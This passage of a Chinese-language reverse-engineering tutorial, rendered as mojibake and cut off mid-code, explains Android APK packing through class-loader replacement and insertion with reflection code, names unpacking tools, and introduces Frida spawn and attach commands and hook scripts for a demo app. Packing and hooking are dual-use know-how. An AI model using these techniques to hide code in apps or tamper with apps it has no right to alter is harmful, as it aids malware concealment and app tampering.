å¯†çš„æºApkç¨‹åºå¤–é¢æœ‰å¥—ä¸Šäº†ä¸€å±‚å¤–å£³ï¼Œç®€å•è¿‡ç¨‹ä¸ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544546.png" alt="image-20250929130703014"></p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544547.png" alt="image-20250929130743024" style="zoom:33%;" /><p>åŠ å£³ä¾‹å­ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544548.png" alt="image-20250929143926144"></p><p>æˆ‘ä»¬å¾ˆæ˜æ˜¾çœ‹è§ï¼Œé™¤äº†ä¸€ä¸ªä»£ç†ç±»<code>Application</code>ï¼Œå…¶ä»–ç›¸å…³çš„ä»£ç ä¿¡æ¯éƒ½æ— æ³•å‘ç°</p><p>åœ¨ä»£ç†ç±»ä¸­åå°„è°ƒç”¨äº†ä¸€äº›æ–¹æ³•ï¼Œå¾ˆæ˜¾ç„¶æˆ‘ä»¬è§£æå‡ºçš„ç»“æœéƒ½æ— æ³•æŸ¥æ‰¾ï¼Œå¾ˆæ˜æ˜¾å°±è¯´æ˜åœ¨<code>Application.attchBaseContext()</code>å’Œ<code>Application.onCreate()</code>ä¸­å¿…é¡»è¦å®Œæˆå¯¹æºåŠ å¯†çš„<code>dex</code>çš„<strong>åŠ¨æ€åŠ è½½å’Œè§£å¯†</strong></p><p>AppåŠ è½½åº”ç”¨è§£ææ—¶æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li><code>BootClassLoader</code>åŠ è½½ç³»ç»Ÿæ ¸å¿ƒåº“</li><li><code>PathClassLoader</code>åŠ è½½APPè‡ªèº«dex</li><li>è¿›å…¥APPè‡ªèº«ç»„ä»¶ï¼Œè§£æ<code>AndroidManifest.xml</code>ï¼Œç„¶åæŸ¥æ‰¾<code>Application</code>ä»£ç†</li><li>è°ƒç”¨å£°æ˜<code>Application</code>çš„<code>attachBaseContext()</code>å¯¹æºç¨‹åºè¿›è¡ŒåŠ¨æ€åŠ è½½æˆ–è§£å¯†</li><li>è°ƒç”¨å£°æ˜<code>Application</code>çš„<code>onCreate()</code>å¯¹æºç¨‹åºè¿›è¡ŒåŠ¨æ€åŠ è½½æˆ–è§£å¯†</li><li>è¿›å…¥<code>MainActivity</code>ä¸­çš„<code>attachBaseContext()</code>ï¼Œç„¶åè¿›å…¥<code>onCreate()</code>å‡½æ•°ï¼Œæ‰§è¡Œæºç¨‹åºä»£ç </li></ol><p>ä¸Šé¢æˆ‘ä»¬å·²ç»å¾ˆæ¸…æ™°çš„äº†è§£äº†å£³åŠ è½½çš„æµç¨‹ï¼Œæˆ‘ä»¬å¾ˆæ˜æ˜¾çš„æ„è¯†åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä»å¤´åˆ°å°¾éƒ½æ˜¯ç”¨<code>PathClassLoader</code>æ¥åŠ è½½dex</p><h4 id="ç®€å•æ•´ä½“åŠ å£³"><a href="#ç®€å•æ•´ä½“åŠ å£³" class="headerlink" title="ç®€å•æ•´ä½“åŠ å£³"></a>ç®€å•æ•´ä½“åŠ å£³</h4><p>æˆ‘ä»¬è¦æƒ³åŠ¨æ€åŠ è½½dexæ–‡ä»¶å¿…é¡»ä½¿ç”¨è‡ªå®šä¹‰çš„<code>DexClassLoader</code>ï¼Œä½†æ˜¯ç›´æ¥ä½¿ç”¨<code>DexClassLoader</code>è¿›è¡ŒåŠ è½½ï¼Œä¼šæŠ¥å¼‚å¸¸ï¼Œæ˜¯å› ä¸º<code>DexClassLoader</code>åŠ è½½çš„ç±»æ˜¯<strong>æ²¡æœ‰ç»„ä»¶ç”Ÿå‘½å‘¨æœŸ</strong>çš„ï¼Œå³<code>DexClassLoader</code>å³ä½¿é€šè¿‡å¯¹APKçš„åŠ¨æ€åŠ è½½å®Œæˆäº†å¯¹ç»„ä»¶ç±»çš„åŠ è½½ï¼Œå½“ç³»ç»Ÿå¯åŠ¨è¯¥ç»„ä»¶æ—¶ï¼Œä¾ç„¶ä¼šå‡ºç°åŠ è½½ç±»å¤±è´¥çš„å¼‚å¸¸</p><p>æ‰€ä»¥æˆ‘ä»¬è¦æƒ³ä½¿ç”¨<code>DexClassLoader</code>è¿›è¡ŒåŠ¨æ€åŠ è½½dexï¼Œæˆ‘ä»¬éœ€è¦<strong>è¿›è¡Œç±»åŠ è½½å™¨çš„ä¿®æ­£</strong></p><p>ä¸»è¦æœ‰ä¸¤ç§æ–¹æ¡ˆï¼š</p><ol><li>æ›¿æ¢ç³»ç»Ÿç»„ä»¶ç±»åŠ è½½å™¨ä¸ºæˆ‘ä»¬çš„<code>DexClassLoader</code>ï¼ŒåŒæ—¶è®¾ç½®<code>DexClassLoader</code>çš„<code>parent</code>ä¸ºç³»ç»Ÿç»„ä»¶åŠ è½½å™¨</li><li>æ‰“ç ´åŸæœ‰çš„åŒäº²å§”æ´¾å…³ç³»ï¼Œåœ¨ç³»ç»Ÿç»„ä»¶ç±»åŠ è½½å™¨<code>PathClassLoader</code>å’Œ<code>BootClassLoader</code>çš„ä¸­é—´æ’å…¥æˆ‘ä»¬è‡ªå·±çš„<code>DexClassLoader</code></li></ol><h5 id="ç±»åŠ è½½å™¨æ›¿æ¢"><a href="#ç±»åŠ è½½å™¨æ›¿æ¢" class="headerlink" title="ç±»åŠ è½½å™¨æ›¿æ¢"></a>ç±»åŠ è½½å™¨æ›¿æ¢</h5><p><code>LoadedApk</code>ä¸»è¦è´Ÿè´£åŠ è½½ä¸€ä¸ªApkç¨‹åºï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå­—æ®µ<code>mclassLoader</code>ï¼Œæˆ‘ä»¬é€šè¿‡åå°„æ¥ä½¿ç”¨æˆ‘ä»¬çš„<code>DexClassLoader</code>å°†å…¶æ›¿æ¢ï¼Œå°±èƒ½è®©æˆ‘ä»¬çš„<code>DexClassLoader</code>æ‹¥æœ‰ç”Ÿå‘½å‘¨æœŸ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">replaceClassLoader</span><span class="params">(Context context,ClassLoader dexClassLoader)</span>&#123;</span><br><span class="line">   <span class="type">ClassLoader</span> <span class="variable">pathClassLoader</span> <span class="operator">=</span> MainActivity.class.getClassLoader();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="comment">//1.è·å–ActivityThreadå®ä¾‹</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">ActivityThread</span> <span class="operator">=</span> pathClassLoader.loadClass(<span class="string">&quot;android.app.ActivityThread&quot;</span>);</span><br><span class="line">       <span class="type">Method</span> <span class="variable">currentActivityThread</span> <span class="operator">=</span> ActivityThread.getDeclaredMethod(<span class="string">&quot;currentActivityThread&quot;</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">activityThreadObj</span> <span class="operator">=</span> currentActivityThread.invoke(<span class="literal">null</span>);</span><br><span class="line">       <span class="comment">//2.é€šè¿‡åå°„è·å¾—ç±»åŠ è½½å™¨</span></span><br><span class="line">       <span class="comment">//final ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt; mPackages = new ArrayMap&lt;&gt;();</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">mPackagesField</span> <span class="operator">=</span> ActivityThread.getDeclaredField(<span class="string">&quot;mPackages&quot;</span>);</span><br><span class="line">       mPackagesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="comment">//3.æ‹¿åˆ°LoadedApk</span></span><br><span class="line">       <span class="type">ArrayMap</span> <span class="variable">mPackagesObj</span> <span class="operator">=</span> (ArrayMap) mPackagesField.get(activityThreadObj);</span><br><span class="line">       <span class="type">String</span> <span class="variable">packagename</span> <span class="operator">=</span> context.getPackageName();</span><br><span class="line">       <span class="type">WeakReference</span> <span class="variable">wr</span> <span class="operator">=</span> (WeakReference) mPackagesObj.get(packagename);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">LoadApkObj</span> <span class="operator">=</span> wr.get();</span><br><span class="line">       <span class="comment">//4.æ‹¿åˆ°mclassLoader</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">LoadedApkClass</span> <span class="operator">=</span> pathClassLoader.loadClass(<span class="string">&quot;android.app.LoadedApk&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">mClassLoaderField</span> <span class="operator">=</span> LoadedApkClass.getDeclaredField(<span class="string">&quot;mClassLoader&quot;</span>);</span><br><span class="line">       mClassLoaderField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">mClassLoader</span> <span class="operator">=</span>mClassLoaderField.get(LoadApkObj);</span><br><span class="line">       Log.e(<span class="string">&quot;mClassLoader&quot;</span>,mClassLoader.toString());</span><br><span class="line">       <span class="comment">//5.å°†ç³»ç»Ÿç»„ä»¶ClassLoaderç»™æ›¿æ¢</span></span><br><span class="line">       mClassLoaderField.set(LoadApkObj,dexClassLoader);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ç±»åŠ è½½å™¨æ’å…¥"><a href="#ç±»åŠ è½½å™¨æ’å…¥" class="headerlink" title="ç±»åŠ è½½å™¨æ’å…¥"></a>ç±»åŠ è½½å™¨æ’å…¥</h5><p> ç±»åŠ è½½å™¨åˆšæ‹¿åˆ°ç±»ï¼Œå¹¶ä¸ä¼šç›´æ¥è¿›è¡ŒåŠ è½½ï¼Œè€Œæ˜¯å…ˆåˆ¤æ–­è‡ªå·±æ˜¯å¦åŠ è½½ï¼Œå¦‚æœæ²¡æœ‰åŠ è½½åˆ™ç»™è‡ªå·±çš„çˆ¶ç±»ï¼Œçˆ¶ç±»å†ç»™çˆ¶ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬è®©<code>DexClassLoader</code>æˆä¸º<code>PathClassLoader</code>çš„çˆ¶ç±»</p><p>è¿™æ ·å°±å¯ä»¥è§£å†³<code>DexClassLoader</code>ç”Ÿå‘½å‘¨æœŸçš„é—®é¢˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">replaceClassLoader</span><span class="params">(Context context, ClassLoader dexClassLoader)</span>&#123;</span><br><span class="line">    <span class="comment">//å°†pathClassLoaderçˆ¶èŠ‚ç‚¹è®¾ç½®ä¸ºDexClassLoader</span></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">pathClassLoaderobj</span> <span class="operator">=</span> context.getClassLoader();</span><br><span class="line">    Class&lt;ClassLoader&gt; ClassLoaderClass = ClassLoader.class;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">parent</span> <span class="operator">=</span> ClassLoaderClass.getDeclaredField(<span class="string">&quot;parent&quot;</span>);</span><br><span class="line">        parent.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        parent.set(pathClassLoaderobj,dexClassLoader);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œæˆå£³åŠ è½½å™¨çš„ä¿®æ­£åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ­£å¸¸çš„åŠ è½½dexäº†</p><p>ä¹‹ååªéœ€è¦ç¼–å†™<code>Application</code>ä»£ç†çš„<code>onCreate</code>å’Œ<code>attachBaseContext</code>å‡½æ•°å³å¯</p><h3 id="è„±å£³æ–¹æ³•"><a href="#è„±å£³æ–¹æ³•" class="headerlink" title="è„±å£³æ–¹æ³•"></a>è„±å£³æ–¹æ³•</h3><p>å¸¸ç”¨fartã€frida-dexdumpï¼ˆè¦å…ˆè¿‡fridaï¼‰</p><p>ä»¥åè¡¥ï¼Œè¿˜åœ¨å­¦</p><h2 id="FridaåŸºç¡€çŸ¥è¯†"><a href="#FridaåŸºç¡€çŸ¥è¯†" class="headerlink" title="FridaåŸºç¡€çŸ¥è¯†"></a>FridaåŸºç¡€çŸ¥è¯†</h2><h4 id="æ“ä½œæ¨¡å¼"><a href="#æ“ä½œæ¨¡å¼" class="headerlink" title="æ“ä½œæ¨¡å¼:"></a>æ“ä½œæ¨¡å¼:</h4><table><thead><tr><th align="left">æ“ä½œæ¨¡å¼</th><th align="left">æè¿°</th><th align="left">ä¼˜ç‚¹</th><th align="left">ä¸»è¦ç”¨é€”</th></tr></thead><tbody><tr><td align="left">CLIï¼ˆå‘½ä»¤è¡Œï¼‰æ¨¡å¼</td><td align="left">é€šè¿‡å‘½ä»¤è¡Œç›´æ¥å°†JavaScriptè„šæœ¬æ³¨å…¥è¿›ç¨‹ä¸­ï¼Œå¯¹è¿›ç¨‹è¿›è¡Œæ“ä½œ</td><td align="left">ä¾¿äºç›´æ¥æ³¨å…¥å’Œæ“ä½œ</td><td align="left">åœ¨è¾ƒå°è§„æ¨¡çš„æ“ä½œæˆ–è€…éœ€æ±‚æ¯”è¾ƒç®€å•çš„åœºæ™¯ä¸­ä½¿ç”¨</td></tr><tr><td align="left">RPCæ¨¡å¼</td><td align="left">ä½¿ç”¨Pythonè¿›è¡ŒJavaScriptè„šæœ¬çš„æ³¨å…¥å·¥ä½œï¼Œå®é™…å¯¹è¿›ç¨‹è¿›è¡Œæ“ä½œçš„è¿˜æ˜¯JavaScriptè„šæœ¬ï¼Œå¯ä»¥é€šè¿‡RPCä¼ è¾“ç»™Pythonè„šæœ¬æ¥è¿›è¡Œå¤æ‚æ•°æ®çš„å¤„ç†</td><td align="left">åœ¨å¯¹å¤æ‚æ•°æ®çš„å¤„ç†ä¸Šå¯ä»¥é€šè¿‡RPCä¼ è¾“ç»™Pythonè„šæœ¬æ¥è¿›è¡Œï¼Œæœ‰åˆ©äºå‡å°‘è¢«æ³¨å…¥è¿›ç¨‹çš„æ€§èƒ½æŸè€—</td><td align="left">åœ¨å¤§è§„æ¨¡è°ƒç”¨ä¸­æ›´åŠ æ™®éï¼Œç‰¹åˆ«æ˜¯å¯¹äºå¤æ‚æ•°æ®å¤„ç†çš„éœ€æ±‚</td></tr></tbody></table><h4 id="æ³¨å…¥æ¨¡å¼ä¸å¯åŠ¨å‘½ä»¤"><a href="#æ³¨å…¥æ¨¡å¼ä¸å¯åŠ¨å‘½ä»¤" class="headerlink" title="æ³¨å…¥æ¨¡å¼ä¸å¯åŠ¨å‘½ä»¤:"></a>æ³¨å…¥æ¨¡å¼ä¸å¯åŠ¨å‘½ä»¤:</h4><table><thead><tr><th align="left">æ³¨å…¥æ¨¡å¼</th><th align="left">æè¿°</th><th align="left">å‘½ä»¤æˆ–å‚æ•°</th><th align="left">ä¼˜ç‚¹</th><th align="left">ä¸»è¦ç”¨é€”</th></tr></thead><tbody><tr><td align="left">Spawnæ¨¡å¼</td><td align="left">å°†å¯åŠ¨Appçš„æƒåˆ©äº¤ç”±Fridaæ¥æ§åˆ¶ï¼Œå³ä½¿ç›®æ ‡Appå·²ç»å¯åŠ¨ï¼Œåœ¨ä½¿ç”¨Fridaæ³¨å…¥ç¨‹åºæ—¶è¿˜æ˜¯ä¼šé‡æ–°å¯åŠ¨App</td><td align="left">åœ¨CLIæ¨¡å¼ä¸­ï¼ŒFridaé€šè¿‡åŠ ä¸Š -f å‚æ•°æŒ‡å®šåŒ…åä»¥spawnæ¨¡å¼æ“ä½œApp</td><td align="left">é€‚åˆäºéœ€è¦åœ¨Appå¯åŠ¨æ—¶å³è¿›è¡Œæ³¨å…¥çš„åœºæ™¯ï¼Œå¯ä»¥åœ¨Appå¯åŠ¨æ—¶å³æ•è·å…¶è¡Œä¸º</td><td align="left">å½“éœ€è¦ç›‘æ§Appä»å¯åŠ¨å¼€å§‹çš„æ‰€æœ‰è¡Œä¸ºæ—¶ä½¿ç”¨</td></tr><tr><td align="left">Attachæ¨¡å¼</td><td align="left">åœ¨ç›®æ ‡Appå·²ç»å¯åŠ¨çš„æƒ…å†µä¸‹ï¼ŒFridaé€šè¿‡ptraceæ³¨å…¥ç¨‹åºä»è€Œæ‰§è¡ŒHookçš„æ“ä½œ</td><td align="left">åœ¨CLIæ¨¡å¼ä¸­ï¼Œå¦‚æœä¸æ·»åŠ  -f å‚æ•°ï¼Œåˆ™é»˜è®¤ä¼šé€šè¿‡attachæ¨¡å¼æ³¨å…¥App</td><td align="left">é€‚åˆäºå·²ç»è¿è¡Œçš„Appï¼Œä¸ä¼šé‡æ–°å¯åŠ¨Appï¼Œå¯¹ç”¨æˆ·ä½“éªŒå½±å“è¾ƒå°</td><td align="left">åœ¨Appå·²ç»å¯åŠ¨ï¼Œæˆ–è€…æˆ‘ä»¬åªå…³å¿ƒç‰¹å®šæ—¶åˆ»æˆ–ç‰¹å®šåŠŸèƒ½çš„è¡Œä¸ºæ—¶ä½¿ç”¨</td></tr></tbody></table><p>Spawnæ¨¡å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f è¿›ç¨‹å -l hook.js</span><br></pre></td></tr></table></figure><p>attachæ¨¡å¼ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U è¿›ç¨‹å -l hook.js</span><br></pre></td></tr></table></figure><h4 id="åŸºç¡€è¯­æ³•"><a href="#åŸºç¡€è¯­æ³•" class="headerlink" title="åŸºç¡€è¯­æ³•"></a>åŸºç¡€è¯­æ³•</h4><table><thead><tr><th align="left">APIåç§°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><code>Java.use(className)</code></td><td align="left">è·å–æŒ‡å®šçš„Javaç±»å¹¶ä½¿å…¶åœ¨JavaScriptä»£ç ä¸­å¯ç”¨ã€‚</td></tr><tr><td align="left"><code>Java.perform(callback)</code></td><td align="left">ç¡®ä¿å›è°ƒå‡½æ•°åœ¨Javaçš„ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œã€‚</td></tr><tr><td align="left"><code>Java.choose(className, callbacks)</code></td><td align="left">æšä¸¾æŒ‡å®šç±»çš„æ‰€æœ‰å®ä¾‹ã€‚</td></tr><tr><td align="left"><code>Java.cast(obj, cls)</code></td><td align="left">å°†ä¸€ä¸ªJavaå¯¹è±¡è½¬æ¢æˆå¦ä¸€ä¸ªJavaç±»çš„å®ä¾‹ã€‚</td></tr><tr><td align="left"><code>Java.enumerateLoadedClasses(callbacks)</code></td><td align="left">æšä¸¾è¿›ç¨‹ä¸­å·²ç»åŠ è½½çš„æ‰€æœ‰Javaç±»ã€‚</td></tr><tr><td align="left"><code>Java.enumerateClassLoaders(callbacks)</code></td><td align="left">æšä¸¾è¿›ç¨‹ä¸­å­˜åœ¨çš„æ‰€æœ‰Javaç±»åŠ è½½å™¨ã€‚</td></tr><tr><td align="left"><code>Java.enumerateMethods(targetClassMethod)</code></td><td align="left">æšä¸¾æŒ‡å®šç±»çš„æ‰€æœ‰æ–¹æ³•ã€‚</td></tr></tbody></table><h4 id="æ—¥å¿—è¾“å‡ºè¯­æ³•åŒºåˆ«"><a href="#æ—¥å¿—è¾“å‡ºè¯­æ³•åŒºåˆ«" class="headerlink" title="æ—¥å¿—è¾“å‡ºè¯­æ³•åŒºåˆ«"></a>æ—¥å¿—è¾“å‡ºè¯­æ³•åŒºåˆ«</h4><table><thead><tr><th align="left">æ—¥å¿—æ–¹æ³•</th><th align="left">æè¿°</th><th align="left">åŒºåˆ«</th></tr></thead><tbody><tr><td align="left"><code>console.log()</code></td><td align="left">ä½¿ç”¨JavaScriptç›´æ¥è¿›è¡Œæ—¥å¿—æ‰“å°</td><td align="left">å¤šç”¨äºåœ¨CLIæ¨¡å¼ä¸­ï¼Œ<code>console.log()</code>ç›´æ¥è¾“å‡ºåˆ°å‘½ä»¤è¡Œç•Œé¢ï¼Œä½¿ç”¨æˆ·å¯ä»¥å®æ—¶æŸ¥çœ‹ã€‚åœ¨RPCæ¨¡å¼ä¸­ï¼Œ<code>console.log()</code>åŒæ ·è¾“å‡ºåœ¨å‘½ä»¤è¡Œï¼Œä½†å¯èƒ½è¢«Pythonè„šæœ¬çš„è¾“å‡ºå†…å®¹æ©ç›–ã€‚</td></tr><tr><td align="left"><code>send()</code></td><td align="left">Fridaçš„ä¸“æœ‰æ–¹æ³•ï¼Œç”¨äºå‘é€æ•°æ®æˆ–æ—¥å¿—åˆ°å¤–éƒ¨Pythonè„šæœ¬</td><td align="left">å¤šç”¨äºRPCæ¨¡å¼ä¸­ï¼Œå®ƒå…è®¸JavaScriptè„šæœ¬å‘é€æ•°æ®åˆ°Pythonè„šæœ¬ï¼ŒPythonè„šæœ¬å¯ä»¥è¿›ä¸€æ­¥å¤„ç†æˆ–è®°å½•è¿™äº›æ•°æ®ã€‚</td></tr></tbody></table><h3 id="Fridaå¸¸ç”¨API"><a href="#Fridaå¸¸ç”¨API" class="headerlink" title="Fridaå¸¸ç”¨API"></a>Fridaå¸¸ç”¨API</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªåä¸ºhookTest1çš„å‡½æ•°</span></span><br><span class="line">function <span class="title function_">hookTest1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//è·å–ä¸€ä¸ªåä¸º&quot;ç±»å&quot;çš„Javaç±»ï¼Œå¹¶å°†å…¶å®ä¾‹èµ‹å€¼ç»™JavaScriptå˜é‡utils</span></span><br><span class="line">    <span class="type">var</span> <span class="variable">utils</span> <span class="operator">=</span> Java.use(<span class="string">&quot;ç±»å&quot;</span>);</span><br><span class="line">    <span class="comment">//ä¿®æ”¹&quot;ç±»å&quot;çš„&quot;method&quot;æ–¹æ³•çš„å®ç°ã€‚è¿™ä¸ªæ–°çš„å®ç°ä¼šæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼ˆaå’Œbï¼‰</span></span><br><span class="line">    utils.method.implementation = function(a, b)&#123;</span><br><span class="line">            <span class="comment">//å°†å‚æ•°aå’Œbçš„å€¼æ”¹ä¸º123å’Œ456ã€‚</span></span><br><span class="line">        a = <span class="number">123</span>;</span><br><span class="line">        b = <span class="number">456</span>;</span><br><span class="line">        <span class="comment">//è°ƒç”¨ä¿®æ”¹è¿‡çš„&quot;method&quot;æ–¹æ³•ï¼Œå¹¶å°†è¿”å›å€¼å­˜å‚¨åœ¨`retval`å˜é‡ä¸­</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">retval</span> <span class="operator">=</span> <span class="built_in">this</span>.method(a, b);</span><br><span class="line">        <span class="comment">//åœ¨æ§åˆ¶å°ä¸Šæ‰“å°å‚æ•°aï¼Œbçš„å€¼ä»¥åŠ&quot;method&quot;æ–¹æ³•çš„è¿”å›å€¼</span></span><br><span class="line">        console.log(a, b, retval);</span><br><span class="line">        <span class="comment">//è¿”å›&quot;method&quot;æ–¹æ³•çš„è¿”å›å€¼</span></span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .overload()</span></span><br><span class="line"><span class="comment">// .overload(&#x27;è‡ªå®šä¹‰å‚æ•°&#x27;)</span></span><br><span class="line"><span class="comment">// .overload(&#x27;int&#x27;)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//overloadå®šä¹‰é‡è½½å‡½æ•°ï¼Œæ ¹æ®å‡½æ•°çš„å‚æ•°ç±»å‹å¡«</span></span><br><span class="line">    utils.<span class="property">Inner</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.zj.wuaipojie.Demo$Animal&#x27;</span>,<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">aï¼Œb</span>)&#123;</span><br><span class="line">        b = <span class="string">&quot;aaaaaaaaaa&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title class_">Inner</span>(a,b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//ä¿®æ”¹ç±»çš„æ„é€ å‡½æ•°çš„å®ç°ï¼Œ$initè¡¨ç¤ºæ„é€ å‡½æ•°</span></span><br><span class="line">    utils.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">        str = <span class="string">&quot;52&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.$init(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hookTest5</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="comment">//é™æ€å­—æ®µçš„ä¿®æ”¹</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">utils</span> <span class="operator">=</span> Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//ä¿®æ”¹ç±»çš„é™æ€å­—æ®µ&quot;flag&quot;çš„å€¼</span></span><br><span class="line">        utils.staticField.value = <span 